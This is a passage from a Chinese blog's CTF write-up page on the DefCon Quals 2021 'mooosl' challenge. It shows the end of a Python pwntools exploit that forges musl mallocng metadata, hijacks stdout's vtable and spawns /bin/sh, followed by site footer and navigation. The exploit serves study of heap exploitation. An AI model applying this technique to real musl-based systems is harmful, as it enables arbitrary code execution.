class="line">    log.info(&#39;secret: %#x&#39; % secret)</span><br><span class="line"></span><br><span class="line">    fake_meta_addr &#x3D; mmap_base + 0x2010</span><br><span class="line">    fake_mem_addr &#x3D; mmap_base + 0x2040</span><br><span class="line">    stdout &#x3D; libc.address + 0xb4280  </span><br><span class="line">    log.info(&#39;fake_meta_addr: %#x&#39; % fake_meta_addr)</span><br><span class="line">    log.info(&#39;fake_mem_addr: %#x&#39; % fake_mem_addr)</span><br><span class="line">    log.info(&#39;stdout: %#x&#39; % stdout)</span><br><span class="line"></span><br><span class="line">    # Overwrite stdout-0x10 to fake_meta_addr using dequeue during free</span><br><span class="line">    sc &#x3D; 8 # 0x90</span><br><span class="line">    freeable &#x3D; 1</span><br><span class="line">    last_idx &#x3D; 0</span><br><span class="line">    maplen &#x3D; 1</span><br><span class="line">    fake_meta &#x3D; b&#39;&#39;</span><br><span class="line">    fake_meta +&#x3D; p64(stdout - 0x18) # prev</span><br><span class="line">    fake_meta +&#x3D; p64(fake_meta_addr + 0x30) # next</span><br><span class="line">    fake_meta +&#x3D; p64(fake_mem_addr) # mem</span><br><span class="line">    fake_meta +&#x3D; p32(0) + p32(0) # avail_mask, freed_mask</span><br><span class="line">    fake_meta +&#x3D; p64((maplen &lt;&lt; 12) | (sc &lt;&lt; 6) | (freeable &lt;&lt; 5) | last_idx)</span><br><span class="line">    fake_meta +&#x3D; p64(0)</span><br><span class="line"></span><br><span class="line">    fake_mem &#x3D; b&#39;&#39;</span><br><span class="line">    fake_mem +&#x3D; p64(fake_meta_addr) # meta</span><br><span class="line">    fake_mem +&#x3D; p32(1) # active_idx</span><br><span class="line">    fake_mem +&#x3D; p32(0)</span><br><span class="line"></span><br><span class="line">    payload &#x3D; b&#39;&#39;</span><br><span class="line">    payload +&#x3D; b&#39;A&#39; * 0xaa0</span><br><span class="line">    payload +&#x3D; p64(secret) + p64(0)</span><br><span class="line">    payload +&#x3D; fake_meta</span><br><span class="line">    payload +&#x3D; fake_mem</span><br><span class="line">    payload +&#x3D; b&#39;\n&#39;</span><br><span class="line"></span><br><span class="line">    for _ in range(2):</span><br><span class="line">        query(&#39;A&#39; * 0x30)</span><br><span class="line">    query(payload, 0x1200)</span><br><span class="line">    store(&#39;A&#39;, p64(0) + p64(fake_mem_addr + 0x10) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))</span><br><span class="line">    delete(&#39;\n&#39;)</span><br><span class="line">    </span><br><span class="line">    # Create a fake bin using enqueue during free</span><br><span class="line">    sc &#x3D; 8 # 0x90</span><br><span class="line">    last_idx &#x3D; 1</span><br><span class="line">    fake_meta &#x3D; b&#39;&#39;</span><br><span class="line">    fake_meta +&#x3D; p64(0) # prev</span><br><span class="line">    fake_meta +&#x3D; p64(0) # next</span><br><span class="line">    fake_meta +&#x3D; p64(fake_mem_addr) # mem</span><br><span class="line">    fake_meta +&#x3D; p32(0) + p32(0) # avail_mask, freed_mask</span><br><span class="line">    fake_meta +&#x3D; p64((sc &lt;&lt; 6) | last_idx)</span><br><span class="line">    fake_meta +&#x3D; p64(0)</span><br><span class="line"></span><br><span class="line">    fake_mem &#x3D; b&#39;&#39;</span><br><span class="line">    fake_mem +&#x3D; p64(fake_meta_addr) # meta</span><br><span class="line">    fake_mem +&#x3D; p32(1) # active_idx</span><br><span class="line">    fake_mem +&#x3D; p32(0)</span><br><span class="line"></span><br><span class="line">    payload &#x3D; b&#39;&#39;</span><br><span class="line">    payload +&#x3D; b&#39;A&#39; * 0xa90</span><br><span class="line">    payload +&#x3D; p64(secret) + p64(0)</span><br><span class="line">    payload +&#x3D; fake_meta</span><br><span class="line">    payload +&#x3D; fake_mem</span><br><span class="line">    payload +&#x3D; b&#39;\n&#39;</span><br><span class="line"></span><br><span class="line">    query(&#39;A&#39; * 0x30)</span><br><span class="line">    query(payload, 0x1200)</span><br><span class="line">    store(&#39;A&#39;, p64(0) + p64(fake_mem_addr + 0x10) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))</span><br><span class="line">    delete(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">    # Overwrite the fake bin so that it points to stdout</span><br><span class="line">    fake_meta &#x3D; b&#39;&#39;</span><br><span class="line">    fake_meta +&#x3D; p64(fake_meta_addr) # prev</span><br><span class="line">    fake_meta +&#x3D; p64(fake_meta_addr) # next</span><br><span class="line">    fake_meta +&#x3D; p64(stdout - 0x10) # mem</span><br><span class="line">    fake_meta +&#x3D; p32(1) + p32(0) # avail_mask, freed_mask</span><br><span class="line">    fake_meta +&#x3D; p64((sc &lt;&lt; 6) | last_idx)</span><br><span class="line">    fake_meta +&#x3D; b&#39;A&#39; * 0x18</span><br><span class="line">    fake_meta +&#x3D; p64(stdout - 0x10)</span><br><span class="line"></span><br><span class="line">    payload &#x3D; b&#39;&#39;</span><br><span class="line">    payload +&#x3D; b&#39;A&#39; * 0xa80</span><br><span class="line">    payload +&#x3D; p64(secret) + p64(0)</span><br><span class="line">    payload +&#x3D; fake_meta</span><br><span class="line">    payload +&#x3D; b&#39;\n&#39;</span><br><span class="line">    query(payload, 0x1200)</span><br><span class="line"></span><br><span class="line">    # Call calloc(0x80) which returns stdout and call system(&quot;&#x2F;bin&#x2F;sh&quot;) by overwriting vtable</span><br><span class="line">    payload &#x3D; b&#39;&#39;</span><br><span class="line">    payload +&#x3D; b&#39;&#x2F;bin&#x2F;sh\0&#39;</span><br><span class="line">    payload +&#x3D; b&#39;A&#39; * 0x20</span><br><span class="line">    payload +&#x3D; p64(heap_base + 1)</span><br><span class="line">    payload +&#x3D; b&#39;A&#39; * 8</span><br><span class="line">    payload +&#x3D; p64(heap_base)</span><br><span class="line">    payload +&#x3D; b&#39;A&#39; * 8</span><br><span class="line">    payload +&#x3D; p64(libc.symbols[&#39;system&#39;])</span><br><span class="line">    payload +&#x3D; b&#39;A&#39; * 0x3c</span><br><span class="line">    payload +&#x3D; p32((1&lt;&lt;32)-1)</span><br><span class="line">    payload +&#x3D; b&#39;\n&#39;</span><br><span class="line">    store(&#39;A&#39;, payload, value_size&#x3D;0x80, wait&#x3D;False)</span><br><span class="line">    #debug()</span><br><span class="line"></span><br><span class="line">    p.irt()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/06/26/%E5%80%9F%E5%8A%A9DefCon-Quals-2021%E7%9A%84mooosl%E5%AD%A6%E4%B9%A0musl-mallocng%EF%BC%88%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%AF%87%EF%BC%89/" class="leancloud-visitors view" data-flag-title="借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2021/06/26/PWN掉一款小型开源OS——用户态利用/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/05/31/借助DefCon-Quals-2021的mooosl学习musl-mallocng（源码审计篇）/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-06-26 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/musl-libc/">musl-libc<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/解题思路/">解题思路<span>8</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#静态分析"><span class="toc-article-text">静态分析</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Leak-libc"><span class="toc-article-text">Leak libc</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#从musl-unlink到FSOP"><span class="toc-article-text">从musl unlink到FSOP</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Script"><span class="toc-article-text">Script</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 sung3r's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
